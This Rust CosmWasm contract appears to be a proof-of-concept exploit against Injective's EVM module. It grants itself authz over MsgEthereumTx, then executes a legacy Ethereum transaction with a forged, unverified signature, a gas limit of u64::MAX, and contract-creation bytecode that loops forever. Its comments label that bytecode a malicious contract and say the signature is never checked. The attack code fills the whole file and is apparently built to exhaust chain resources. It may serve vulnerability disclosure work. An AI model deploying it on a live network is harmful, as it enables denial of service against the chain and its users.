use cosmwasm_std::{entry_point, DepsMut, Env, MessageInfo, Response, StdResult, Binary, CosmosMsg, AnyMsg};
use crate::msg::{ExecuteMsg, InstantiateMsg, MsgGrant, Grant, GenericAuthorization, MsgExec, LegacyTransaction, MsgEthereumTx};
use crate::msg::{pb_encode_message, rlp_encode};

#[entry_point]
pub fn instantiate(
    _deps: DepsMut,
    _env: Env,
    _info: MessageInfo,
    _msg: InstantiateMsg,
) -> StdResult<Response> {
    Ok(Response::new())
}

#[entry_point]
pub fn execute(deps: DepsMut, env: Env, _: MessageInfo, msg: ExecuteMsg) -> StdResult<Response> {
    match msg {
        ExecuteMsg::SubmitAuthzGrant { grantee } => execute_submit_authz_grant(env, grantee),
        ExecuteMsg::SubmitAuthzExec { granter } => execute_submit_authz_exec(deps, env, granter),
    }
}

pub fn execute_submit_authz_grant(env: Env, grantee: String) ->StdResult<Response> {
     // Create the GenericAuthorization
    let generic_auth = GenericAuthorization { 
        msg: "/injective.evm.v1.MsgEthereumTx".to_string(),
    };
    
    // Encode the authorization as Any
    let auth_any = prost_types::Any {
        type_url: "/cosmos.authz.v1beta1.GenericAuthorization".to_string(),
        value: pb_encode_message(&generic_auth).unwrap(),
    };

    // Create the Grant
    let grant = Grant {
        authorization: Some(auth_any),
        expiration: None,
    };

    // Create the MsgGrant
    let msg_grant = MsgGrant {
        granter:  env.contract.address.to_string(),
        grantee: grantee,
        grant: Some(grant),
    };

    // Encode to bytes
    let encoded = pb_encode_message(&msg_grant).unwrap();

    let any_msg = CosmosMsg::Any(AnyMsg{
        type_url: "/cosmos.authz.v1beta1.MsgGrant".to_string(),
        value: Binary::from(encoded),
    });

    Ok(Response::new().add_message(any_msg))
}

pub fn execute_submit_authz_exec(_deps: DepsMut, env: Env, granter: String) ->StdResult<Response> {
    // create legacy tx with u64::MAX as gas limit
    let tx = LegacyTransaction {
         nonce: 0,
         gas_price: 1,
         gas_limit: u64::MAX,
         to: None,
         value: 0,
         // this is the code for "creation" of the malicious evm contract, it consists of 3 opcodes: jumpdest, push0 and jump. Basically and infinite loop limited with gas.
         data: hex::decode("5b5956").unwrap(),
     };

    // rlp encode it with "signature", we don't care about the signature since it doesn't get verified
    let rlp_encoded_tx = rlp_encode(&tx, &[1; 32], &[1; 32], 27);
    
    let evm_msg = MsgEthereumTx {
        from: _deps
            .api
            .addr_canonicalize(&granter) // also try env.contract.address.as_str()
            .unwrap()
            .to_vec(),
        raw: rlp_encoded_tx.to_vec(),
    };

    let any_evm_msg = prost_types::Any {
         type_url:"/injective.evm.v1.MsgEthereumTx".to_string(),
         value: pb_encode_message(&evm_msg).unwrap(),
    };

    let mut exec_msgs = Vec::new(); 
    exec_msgs.push(any_evm_msg);
        
    // Create the Authz MsgExec
    let msg_exec = MsgExec {
        // wasmbinding message-handler only accepts msgs signed by the contract,
        // and MsgExec.GetSigner, as implemented in the authz module, returns 
        // the grantee address. Therefore, grantee has to be the contract address.
        grantee: env.contract.address.to_string(), 
        msgs: exec_msgs,
    };

    // Encode to bytes
    let encoded = pb_encode_message(&msg_exec).unwrap();

    let any_msg = CosmosMsg::Any(AnyMsg{
        type_url: "/cosmos.authz.v1beta1.MsgExec".to_string(),
        value: Binary::from(encoded),
    });

    Ok(Response::new().add_message(any_msg))
}
